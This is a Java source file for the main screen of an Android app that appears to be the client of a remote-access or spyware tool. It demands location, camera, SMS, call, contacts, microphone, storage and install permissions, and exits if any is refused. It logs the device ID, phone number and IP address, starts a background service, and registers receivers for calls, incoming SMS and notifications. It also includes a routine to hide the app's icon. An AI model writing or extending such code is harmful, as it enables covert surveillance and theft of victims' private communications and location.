package com.ot.grhq.client;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Phone;
import com.ot.grhq.client.functionality.SMS;
import com.ot.grhq.client.functionality.Screenshot;
import com.ot.grhq.client.functionality.Utils;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 200;
    private static String[] PERMISSIONS = {
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.REQUEST_INSTALL_PACKAGES
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkPermissions();

        Log.d("eeee", Utils.deviceID(getApplicationContext()));
        Log.d("eeee", Utils.ipAddress());
        Log.d("eeee", Utils.phoneNumber(getApplicationContext()));
        Log.d("eeee", String.valueOf(Utils.clientID(getApplicationContext())));

//        hideApplicationIcon();
        startService(new Intent(this, MainService.class));

        // Phone call broadcast receiver
        MainService.Call callReceiver = new MainService.Call();
        IntentFilter callFilter = new IntentFilter("android.intent.action.PHONE_STATE");
        registerReceiver(callReceiver, callFilter);

        // SMS broadcast receiver
        MainService.SMS smsReceiver = new MainService.SMS();
        IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, smsFilter);

        // Notification broadcast receiver
        MainService.NotificationReceiver notificationReceiver = new MainService.NotificationReceiver();
        IntentFilter notificationFilter = new IntentFilter("notification_data");
        registerReceiver(notificationReceiver, notificationFilter);
    }

    /**
     * Hide application icon on first startup
     */
    private void hideApplicationIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    /**
     * Check if necessary permissions are granted
     * @return <c>true</c> if all are granted; false otherwise
     */
    private void checkPermissions() {
        for (String permission : PERMISSIONS) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
                    getPermission(permission);
            }
        }
    }

    /**
     * Request for permission
     */
    private void getPermission(String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            requestPermissions(new String[] { permission }, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED)
                finishAffinity();
        }
    }
}